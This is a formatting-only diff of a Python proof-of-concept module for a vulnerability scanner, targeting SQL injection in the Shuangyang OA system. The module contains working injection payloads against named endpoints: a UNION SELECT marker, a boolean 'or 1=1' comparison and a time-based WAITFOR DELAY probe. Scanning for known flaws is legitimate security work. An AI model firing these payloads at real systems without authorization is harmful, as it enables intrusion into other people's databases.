@@ -5,11 +5,12 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 import time
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Shuangyang_0001' # 平台漏洞编号，留空
+    vuln_id = 'Shuangyang_0001'  # 平台漏洞编号，留空
     name = '双杨OA系统 SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-05-12'  # 漏洞公布时间
     desc = '''
         双杨OA系统多处存在SQL注入漏洞：
@@ -25,6 +26,7 @@ class Vuln(ABVuln):
     product = '双杨OA系统'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = 'fe3cb4a3-3356-47bb-a6a6-ed98f9a1c3c2'
     author = '47bwy'  # POC编写者
@@ -37,8 +39,8 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #refer:http://www.wooyun.org/bugs/wooyun-2015-0113260
+
+            # refer:http://www.wooyun.org/bugs/wooyun-2015-0113260
             hh = hackhttp.hackhttp()
             payloads = [
                 '/ObjSwitch/HYTZ.aspx?userid=1',
@@ -53,24 +55,22 @@ class Poc(ABPoc):
             ]
             for payload in payloads:
                 for getdata in getdatas:
-                    url = self.target + payload 
+                    url = self.target + payload
                     code, head, res, errcode, _ = hh.http(url + getdata)
-                    if 'master' in res or 'qxzzq1qxxbq' in res :
+                    if 'master' in res or 'qxzzq1qxxbq' in res:
                         #security_hole(url + "  :found sql Injection")
                         self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                             target=self.target, name=self.vuln.name))
 
-            
             payload = '/FormBuilder/PrintFormList.aspx?file_id=1'
             getdata = '%29%20UNION%20ALL%20SELECT%20CHAR%28113%29%2bCHAR%28120%29%2bCHAR%28113%29%2bCHAR%28120%29%2bCHAR%28113%29%2bCHAR%2898%29%2bCHAR%2899%29%2bCHAR%2873%29%2bCHAR%28110%29%2bCHAR%2876%29%2bCHAR%2886%29%2bCHAR%2869%29%2bCHAR%2874%29%2bCHAR%28104%29%2bCHAR%2886%29%2bCHAR%28113%29%2bCHAR%28112%29%2bCHAR%28107%29%2bCHAR%28120%29%2bCHAR%28113%29%2CNULL--'
-            url =self.target + payload 
+            url = self.target + payload
             code, head, res, errcode, _ = hh.http(url + getdata)
             if 'qxqxqbcInLVEJhVqpkxq' in res:
                 #security_hole(url + "  :found sql Injection")
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
-            
             payload = '/FormBuilder/PrintFormList.aspx?file_id=1'
             getdata1 = '%29%20or%201%3D1--'
             getdata2 = '%29%20or%201%3D2--'
@@ -79,12 +79,11 @@ class Poc(ABPoc):
             code2, head2, res2, errcode2, _ = hh.http(url + getdata2)
             m1 = re.findall('option', res1)
             m2 = re.findall('option', res2)
-            if m1 != m2 :
+            if m1 != m2:
                 #security_hole(url + "  :found sql Injection")
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
-            
             payload = '/FormBuilder/yjzxList.aspx?id=1'
             getdata = '%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--'
             url = self.target + payload
@@ -93,7 +92,7 @@ class Poc(ABPoc):
             t2 = time.time()
             code2, head, res2, errcode2, _ = hh.http(url+getdata)
             t3 = time.time()
-            if t3 - 2*t2 + t1 > 3:    
+            if t3 - 2*t2 + t1 > 3:
                 #security_hole(url + "  :found sql Injection")
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
@@ -103,6 +102,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
